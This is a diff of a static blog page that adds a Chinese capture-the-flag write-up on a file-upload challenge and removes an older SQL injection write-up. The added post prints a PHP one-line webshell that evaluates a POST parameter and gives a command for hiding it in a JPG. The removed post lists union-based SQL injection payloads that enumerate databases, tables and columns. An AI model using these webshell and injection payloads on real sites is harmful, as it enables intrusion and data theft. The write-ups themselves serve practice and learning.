@@ -116,7 +116,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-count">22</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -146,6 +146,71 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://cxdshibaba.github.io/2022/04/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cxd的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">文件上传漏洞</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-04-18 21:04:49 / Modified: 21:15:02" itemprop="dateCreated datePublished" datetime="2022-04-18T21:04:49+08:00">2022-04-18</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>攻防世界里的upload1题目，首先查看源代码，发现只能上传jpg格式的文件，尝试使用带有一句话木马的jpg图片。<br>如何准备一句话木马：<br>1、准备任意图片pho.jpg<br>2、准备木马文件hack.php<br><?php @eval($_POST['hack']);?><br>3、利用系统命令，将木马复制到图片文件中，产生图片木马hack.jpg<br>copy pho.jpg/b+hack.php/a hack.jpg<br>将此文件上传，在burpsuite抓包<br><img src="https://s3.bmp.ovh/imgs/2022/04/18/0c198b14cfe5ef3b.png"><br>然后修改文件后缀为php上传<br><img src="https://s3.bmp.ovh/imgs/2022/04/18/4b87c1d34fc509bd.png"><br>这里显示上传成功，接着用蚁剑连接<br><img src="https://s3.bmp.ovh/imgs/2022/04/18/e30b408e9ec8e432.png"><br>这里的地址要对应burpsuite上传的地址，最后成功拿到flag<br><img src="https://s3.bmp.ovh/imgs/2022/04/18/9172616e410dafce.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -736,71 +801,6 @@ print_r($class1_ser);
     
     <div class="post-body" itemprop="articleBody">
           <p>首先输入?id=1测试，未发现漏洞，接着输入?=1’，报错，说明存在注入点<br><img src="https://i.bmp.ovh/imgs/2021/11/3629592a82d2adf7.png"><br>接着使用orde by查询可知有三列<br><img src="https://i.bmp.ovh/imgs/2021/11/49412bcd178ce46f.png"><br>接着用联合查询语句<br><img src="https://i.bmp.ovh/imgs/2021/11/48b1ca9a65a8abd3.png"><br>没有回显，无法使用联合查询语句，说明本题为盲注，可尝试用left函数及burpsuite<br><img src="https://i.bmp.ovh/imgs/2021/11/d7c80ae072931d36.png"><br>由burpsuite可知数据库的首位字母为’s’<br><img src="https://i.bmp.ovh/imgs/2021/11/b44a1962cd714a79.png"><br>第二位字母为’e’<br>由此得出数据库名为’security’</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://cxdshibaba.github.io/2021/11/11/%E9%A2%98%E7%9B%AEeasy-sql/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Cxd的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/11/11/%E9%A2%98%E7%9B%AEeasy-sql/" class="post-title-link" itemprop="url">题目easy_sql</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2021-11-11 19:56:09 / Modified: 20:23:32" itemprop="dateCreated datePublished" datetime="2021-11-11T19:56:09+08:00">2021-11-11</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>培训的题目，感觉有点懵，想了好久……..<br>首先看到页面参数为wllm<br>先尝试输入？wllm=1<br><img src="https://i.bmp.ovh/imgs/2021/11/b18c89c31a27ed32.png"><br>接着尝试？wllm=1’<br><img src="https://i.bmp.ovh/imgs/2021/11/f9eafa4bdf0aa2a9.png"><br>说明存在sql出入漏洞，接着用order by判断有几行<br><img src="https://i.bmp.ovh/imgs/2021/11/ad1731300884dfca.png"><br>判断有3行，接着先查询所有数据库，输入?wllm=-1’ union select 1,2,database()–+<br><img src="https://i.bmp.ovh/imgs/2021/11/178dde1cc45bbe2a.png"><br>接着查询test_db表，输入?wllm=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’test_db’–+<br><img src="https://i.bmp.ovh/imgs/2021/11/a36e17a705d6ca28.png"><br>接着查test_tb字段，输入?wllm=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’test_tb’–+<br><img src="https://i.bmp.ovh/imgs/2021/11/b837ab4a84da968d.png"><br>最后取出flag，输入?wllm=-1’ union select 1,2,flag from test_tb–+<br><img src="https://i.bmp.ovh/imgs/2021/11/d329211248661b07.png"></p>
 
       
     </div>
